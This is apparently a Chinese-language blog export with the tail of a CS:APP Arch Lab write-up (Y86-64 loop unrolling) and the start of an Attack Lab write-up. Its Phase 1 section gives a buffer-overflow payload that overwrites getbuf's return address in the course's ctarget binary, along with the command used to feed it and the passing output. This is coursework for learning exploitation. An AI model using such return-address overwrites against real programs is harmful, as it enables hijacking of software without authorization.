	<span class="nf">iaddq</span> <span class="kc">$</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdx</span>		<span class="err">#</span> <span class="nv">len</span><span class="o">--</span>
	<span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">8</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdi</span>		<span class="err">#</span> <span class="nv">src</span><span class="o">++</span>
	<span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">8</span><span class="p">,</span> <span class="o">%</span><span class="nb">rsi</span>		<span class="err">#</span> <span class="nb">ds</span><span class="nv">t</span><span class="o">++</span>
	<span class="nf">andq</span> <span class="o">%</span><span class="nb">rdx</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>		<span class="err">#</span> <span class="nv">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="nv">?</span>
	<span class="nf">jg</span> <span class="nv">Loop</span>			<span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Loop</span><span class="p">:</span>
</code></pre></div></div> <p>同样测试，得分居然还是0</p> <p>Average CPE = 12.70虽然有提升，但是很少（毕竟只是照抄了Part B）。</p> <hr/> <p>好吧，看来光靠<code class="language-plaintext highlighter-rouge">iaddq</code>是无法取得巨大突破，只能求助于第五章节的内容。</p> <p>最直接的修改就是循环展开(<code class="language-plaintext highlighter-rouge">loop unrolling</code>)</p> <p>为什么循环展开能够优化性能？</p> <p>因为循环展开会尽可能降低循环判断分支的次数，以及可以将循环体内的代码并行执行，或者是提高cache hit</p> <p>这里10路展开:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="o">/*</span> <span class="kc">$</span><span class="nf">begin</span> <span class="nv">ncopy</span><span class="o">-</span><span class="nv">ys</span> <span class="o">*/</span>
<span class="err">##################################################################</span>
<span class="err">#</span> <span class="nf">ncopy.ys</span> <span class="o">-</span> <span class="nv">Copy</span> <span class="nv">a</span> <span class="nv">src</span> <span class="nb">bl</span><span class="nv">ock</span> <span class="nv">of</span> <span class="nv">len</span> <span class="kt">word</span><span class="nv">s</span> <span class="nv">to</span> <span class="nb">ds</span><span class="nv">t.</span>
<span class="err">#</span> <span class="nf">Return</span> <span class="nv">the</span> <span class="nv">number</span> <span class="nv">of</span> <span class="nv">positive</span> <span class="kt">word</span><span class="nv">s</span> <span class="p">(</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="nv">contained</span> <span class="nv">in</span> <span class="nv">src.</span>
<span class="err">#</span>
<span class="err">#</span> <span class="nf">Include</span> <span class="nv">your</span> <span class="nv">name</span> <span class="nv">and</span> <span class="nv">ID</span> <span class="nv">here.</span>
<span class="err">#</span>
<span class="err">#</span> <span class="nf">Describe</span> <span class="nv">how</span> <span class="nv">and</span> <span class="nv">why</span> <span class="nv">you</span> <span class="nv">modified</span> <span class="nv">the</span> <span class="nv">baseline</span> <span class="nv">code.</span>
<span class="err">#</span>
<span class="err">##################################################################</span>
<span class="err">#</span> <span class="nf">Do</span> <span class="nv">not</span> <span class="nv">modify</span> <span class="nv">this</span> <span class="nv">portion</span>
<span class="err">#</span> <span class="nf">Function</span> <span class="nv">prologue.</span>
<span class="err">#</span> <span class="o">%</span><span class="nf">rdi</span> <span class="err">=</span> <span class="nv">src</span><span class="p">,</span> <span class="o">%</span><span class="nb">rsi</span> <span class="err">=</span> <span class="nb">ds</span><span class="nv">t</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdx</span> <span class="err">=</span> <span class="nv">len</span>
<span class="nl">ncopy:</span>

<span class="err">##################################################################</span>
<span class="err">#</span> <span class="nf">You</span> <span class="nv">can</span> <span class="nv">modify</span> <span class="nv">this</span> <span class="nv">portion</span>
        <span class="err">#</span> <span class="nf">Loop</span> <span class="nv">header</span>

<span class="err">#</span> <span class="nf">ten</span><span class="o">-</span><span class="nv">way</span> <span class="nv">loop</span> <span class="nv">unrolling</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdx</span>        <span class="err">#</span> <span class="nv">len</span> <span class="o">-</span> <span class="mi">10</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="nv">?</span>
        <span class="nf">jl</span> <span class="nv">L0R9</span>
<span class="nl">Loop1:</span>
        <span class="nf">mrmovq</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>      <span class="err">#</span> <span class="nv">val</span> <span class="err">=</span> <span class="o">*</span><span class="nv">src</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>      <span class="err">#</span> <span class="o">*</span><span class="nb">ds</span><span class="nv">t</span> <span class="err">=</span> <span class="nv">val</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>           <span class="err">#</span> <span class="nv">val</span> <span class="o">&lt;</span><span class="err">=</span> <span class="mi">0</span><span class="nv">?</span>
        <span class="nf">jle</span> <span class="nv">Loop2</span>               <span class="err">#</span> <span class="nv">if</span> <span class="nv">so</span><span class="p">,</span> <span class="nv">goto</span> <span class="nv">Loop2</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>          <span class="err">#</span> <span class="nv">count</span><span class="o">++</span>
<span class="nl">Loop2:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop3</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop3:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop4</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop4:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop5</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop5:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop6</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop6:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x28</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop7</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop7:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x30</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop8</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop8:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x38</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop9</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop9:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x40</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Loop10</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Loop10:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x48</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Step</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Step:</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mh">0x50</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdi</span>		<span class="err">#</span> <span class="nv">i</span> <span class="o">+</span><span class="err">=</span> <span class="mi">10</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mh">0x50</span><span class="p">,</span> <span class="o">%</span><span class="nb">rsi</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdx</span>
        <span class="nf">jge</span> <span class="nv">Loop1</span>

<span class="err">#</span> <span class="nf">applying</span> <span class="nv">range</span> <span class="nb">ch</span><span class="nv">ecks</span> <span class="nv">to</span> <span class="nv">remainders</span>
<span class="nl">L0R9:</span>
        <span class="nf">iaddq</span>   <span class="kc">$</span><span class="mi">7</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>         <span class="err">#</span> <span class="nv">Compare</span> <span class="nv">with</span> <span class="mi">3</span> <span class="p">(</span><span class="nv">len</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">-</span> <span class="mi">3</span><span class="p">)</span>
        <span class="nf">jl</span>      <span class="nv">L0R2</span>            <span class="err">#</span> <span class="nv">len</span> <span class="o">&lt;</span> <span class="mi">3</span>
        <span class="nf">jg</span>      <span class="nv">L4R9</span>            <span class="err">#</span> <span class="nv">len</span> <span class="o">&gt;</span> <span class="mi">3</span>
        <span class="nf">je</span>      <span class="nv">Rem3</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">3</span>
<span class="nl">L0R2:</span>
        <span class="nf">iaddq</span>   <span class="kc">$</span><span class="mi">2</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>         <span class="err">#</span> <span class="nv">Compare</span> <span class="nv">with</span> <span class="mi">1</span> <span class="p">(</span><span class="nv">len</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
        <span class="nf">je</span>      <span class="nv">Rem1</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">1</span>
        <span class="nf">jg</span>      <span class="nv">Rem2</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">2</span>
        <span class="nf">ret</span>                     <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">0</span>
<span class="nl">L4R6:</span>
        <span class="nf">iaddq</span>   <span class="kc">$</span><span class="mi">2</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>         <span class="err">#</span> <span class="nv">Compare</span> <span class="nv">with</span> <span class="mi">5</span> <span class="p">(</span><span class="nv">len</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>
        <span class="nf">jl</span>      <span class="nv">Rem4</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">4</span>
        <span class="nf">je</span>      <span class="nv">Rem5</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">5</span>
        <span class="nf">jg</span>      <span class="nv">Rem6</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">6</span>
<span class="nl">L4R9:</span>
        <span class="nf">iaddq</span>   <span class="kc">$</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>        <span class="err">#</span> <span class="nv">Compare</span> <span class="nv">with</span> <span class="mi">7</span> <span class="p">(</span><span class="nv">len</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">-</span> <span class="mi">7</span><span class="p">)</span>
        <span class="nf">jl</span>      <span class="nv">L4R6</span>            <span class="err">#</span> <span class="nv">len</span> <span class="o">&lt;</span> <span class="mi">7</span>
        <span class="nf">je</span>      <span class="nv">Rem7</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">7</span>
<span class="nl">L8R9:</span>
        <span class="nf">iaddq</span>   <span class="kc">$</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>        <span class="err">#</span> <span class="nv">Compare</span> <span class="nv">with</span> <span class="mi">8</span> <span class="p">(</span><span class="nv">len</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
        <span class="nf">je</span>      <span class="nv">Rem8</span>            <span class="err">#</span> <span class="nv">len</span> <span class="err">==</span> <span class="mi">8</span>

<span class="err">#</span> <span class="nf">dealing</span> <span class="nv">with</span> <span class="nv">remainders</span>
<span class="nl">Rem9:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x40</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem8</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem8:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x38</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem7</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem7:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x30</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem6</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem6:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x28</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem5</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem5:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem4</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem4:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem3</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem3:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem2</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem2:</span>
        <span class="nf">mrmovq</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Rem1</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
<span class="nl">Rem1:</span>
        <span class="nf">mrmovq</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">rmmovq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rsi</span><span class="p">)</span>
        <span class="nf">andq</span> <span class="o">%</span><span class="nv">r8</span><span class="p">,</span> <span class="o">%</span><span class="nv">r8</span>
        <span class="nf">jle</span> <span class="nv">Done</span>
        <span class="nf">iaddq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>

<span class="err">##################################################################</span>
<span class="err">#</span> <span class="nf">Do</span> <span class="nv">not</span> <span class="nv">modify</span> <span class="nv">the</span> <span class="nv">following</span> <span class="nv">section</span> <span class="nv">of</span> <span class="nv">code</span>
<span class="err">#</span> <span class="nf">Function</span> <span class="nv">epilogue.</span>
<span class="nl">Done:</span>
        <span class="nf">ret</span>
<span class="err">##################################################################</span>
<span class="err">#</span> <span class="nf">Keep</span> <span class="nv">the</span> <span class="nv">following</span> <span class="nv">label</span> <span class="nv">at</span> <span class="nv">the</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">your</span> <span class="nv">function</span>
<span class="nl">End:</span>
<span class="err">#</span><span class="o">/*</span> <span class="kc">$</span><span class="nf">end</span> <span class="nv">ncopy</span><span class="o">-</span><span class="nv">ys</span> <span class="o">*/</span>

</code></pre></div></div> <p>接下来进行测试:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./benchmark.pl
</code></pre></div></div> <p>结果显示:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Average CPE	8.39
Score	42.3/60.0
</code></pre></div></div> <p>至少CEP &lt; 9.0 了，如果要更进一步，就得处理某些不必要的load/use冒泡了，就得修改<code class="language-plaintext highlighter-rouge">.hcl</code>文件。</p> <p>笔者在这里已经疲于应对了，暂时这样吧。</p> <h1 id="总结">总结</h1> <p>很像微机原理，这一章走完了微机原理的大部分核心内容。</p>]]></content><author><name></name></author><category term="CSAPP"/><category term="项目"/><category term="c"/><category term="assembly"/><category term="csapp"/><category term="gdb"/><category term="pipeline"/><summary type="html"><![CDATA[Personal Crack on CS:APP3e Arch Lab]]></summary></entry><entry><title type="html">CS:APP3e Attack Lab</title><link href="https://iamnotphage.github.io/blog/2022/CSAPP3eAttack/" rel="alternate" type="text/html" title="CS:APP3e Attack Lab"/><published>2022-06-02T15:59:00+00:00</published><updated>2022-06-02T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/CSAPP3eAttack</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/CSAPP3eAttack/"><![CDATA[<p>确保先阅读并理解了CS:APPe3的<strong>3.10.3</strong>和<strong>3.10.4</strong></p> <p>先反编译:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-d</span> ctarget <span class="o">&gt;</span> ctarget.asm
objdump <span class="nt">-d</span> rtarget <span class="o">&gt;</span> rtarget.asm
</code></pre></div></div> <p>最后确保仔细阅读官网的<code class="language-plaintext highlighter-rouge">writeup</code>，查看每个阶段需要做什么。</p> <h1 id="part-1">Part 1</h1> <p>先明白函数栈的生长方向。ret指令的作用。push指令的作用。%rsp和%rip的作用。</p> <p>能够使用gdb和objdump指令。</p> <p>code-injection攻击只适合这种，没有<code class="language-plaintext highlighter-rouge">栈随机化</code>和<code class="language-plaintext highlighter-rouge">限定可执行代码内存范围</code>的情况</p> <h2 id="phase-1">Phase 1</h2> <p>第一个阶段很简单，只要先查看给函数<code class="language-plaintext highlighter-rouge">getbuf</code>分配了多少栈空间，利用缓冲区溢出，修改<code class="language-plaintext highlighter-rouge">ret</code>指令的返回地址(上一个栈帧的栈顶)就行。</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">00000000004017</span><span class="nf">a8</span> <span class="o">&lt;</span><span class="nv">getbuf</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">4017</span><span class="nl">a8:</span> <span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">28</span>                  	<span class="nv">subq</span>	<span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span> <span class="o">%</span><span class="nb">rsp</span>
  <span class="err">4017</span><span class="nl">ac:</span> <span class="err">48</span> <span class="err">89</span> <span class="nf">e7</span>                     	<span class="nv">movq</span>	<span class="o">%</span><span class="nb">rsp</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdi</span>
  <span class="err">4017</span><span class="nl">af:</span> <span class="nf">e8</span> <span class="mi">8</span><span class="nv">c</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span>               	<span class="nv">callq</span>	<span class="mh">0x401a40</span> <span class="o">&lt;</span><span class="nv">Gets</span><span class="o">&gt;</span>
  <span class="err">4017</span><span class="nl">b4:</span> <span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>               	<span class="nv">movl</span>	<span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
  <span class="err">4017</span><span class="nl">b9:</span> <span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">28</span>                  	<span class="nv">addq</span>	<span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span> <span class="o">%</span><span class="nb">rsp</span>
  <span class="err">4017</span><span class="nl">bd:</span> <span class="nf">c3</span>                           	<span class="nv">retq</span>
  <span class="err">4017</span><span class="nl">be:</span> <span class="err">90</span>                           	<span class="nf">nop</span>
  <span class="err">4017</span><span class="nl">bf:</span> <span class="err">90</span>                           	<span class="nf">nop</span>

<span class="err">00000000004017</span><span class="nf">c0</span> <span class="o">&lt;</span><span class="nv">touch1</span><span class="o">&gt;</span><span class="p">:</span>
</code></pre></div></div> <p>给<code class="language-plaintext highlighter-rouge">getbuf</code>函数分配了<code class="language-plaintext highlighter-rouge">0x28</code>Byte的空间，也就是40Bytes</p> <p>输入48Bytes，最后一个8Byte设定为<code class="language-plaintext highlighter-rouge">touch1</code>函数的地址就行。</p> <p>注意是小端存储。</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
c0 17 40 00 00 00 00 00     # 这里篡改了ret的返回函数地址
</code></pre></div></div> <p>我存储为<code class="language-plaintext highlighter-rouge">phase1.txt</code></p> <p>作为参数运行<code class="language-plaintext highlighter-rouge">rtarget</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>phase1.txt | ./hex2raw | ./ctarget <span class="nt">-q</span>
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1<span class="o">()</span>
Valid solution <span class="k">for </span>level 1 with target ctarget
PASS: Would have posted the following:
	user <span class="nb">id	</span>bovik
	course	15213-f15
	lab	attacklab
